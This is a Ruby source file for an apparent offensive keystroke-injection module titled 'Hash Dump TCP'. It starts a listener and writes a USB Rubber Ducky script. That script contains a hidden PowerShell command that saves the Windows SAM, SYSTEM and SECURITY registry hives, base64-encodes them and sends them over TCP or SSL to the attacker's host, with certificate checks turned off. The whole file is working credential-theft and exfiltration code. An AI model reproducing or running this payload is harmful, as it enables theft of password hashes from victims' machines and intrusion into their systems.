#!/usr/bin/env ruby
require 'skeleton'
require 'metasploit'
class HashDump < Skeleton
  include Msf::Options
  attr_reader :ducky
  self.title = 'Hash Dump TCP'
  self.description = 'Dump hashes from victim machine, and send them over TCP'

  def setup
    @host = @server_setup.host
    @port = @server_setup.port
    @ssl = @server_setup.use_ssl?
  end

  def run
    return unless @server_setup.host_listener?
    server = Server::Start.new(@ssl, @host, @port)
    Thread.new { server.listener }
  end

  def finish
    priv_choice = @ducky_writer.menu
    File.open("#{text_path}#{@file_name}.txt", 'w') do |f|
      f.write(@ducky_writer.write(priv_choice))
      f.write(psh_command(@host, @port, @ssl))
    end
    Ducky::Compile.new("#{@file_name}.txt")
  end

  def path(folder)
    "c:\\windows\\temp\\#{folder}"
  end

  def psh_command(host, port, ssl = nil)
    random_folder = random_name_gen
    psh = 'powershell -nop -wind hidden -noni '
    psh << "$folder='#{path(random_folder)}';mkdir $folder;"
    psh << 'reg.exe save HKLM\\SAM $folder\\sam;'
    psh << 'reg.exe save HKLM\\SYSTEM $folder\\sys;'
    psh << 'reg.exe save HKLM\\SECURITY $folder\\sec;$files=dir $folder;'
    psh << 'foreach($file in $files){$reg_file=[System.Convert]::'
    psh << 'ToBase64String([io.file]::ReadAllBytes($file.FullName));$socket '
    psh << "= New-Object Net.Sockets.TcpClient('#{host}', #{port.to_i});"
    if ssl
      psh << '$stream = $socket.GetStream();$sslStream = New-Object '
      psh << 'System.Net.Security.SslStream($stream,$false,({$True} -as '
      psh << '[Net.Security.RemoteCertificateValidationCallback]));'
      psh << "$sslStream.AuthenticateAsClient('#{host}');$writer = new-object "
      psh << 'System.IO.StreamWriter($sslStream);$writer.WriteLine($file);'
      psh << '$writer.flush();$writer.WriteLine($reg_file);$writer.flush();'
      psh << '$socket.close()}'
    else
      psh << '$stream = $socket.GetStream();$writer = new-object '
      psh << 'System.IO.StreamWriter($stream);$writer.WriteLine($file);'
      psh << '$writer.flush();$writer.WriteLine($reg_file);$writer.flush();'
      psh << '$socket.close()}'
    end
    psh
  end
end
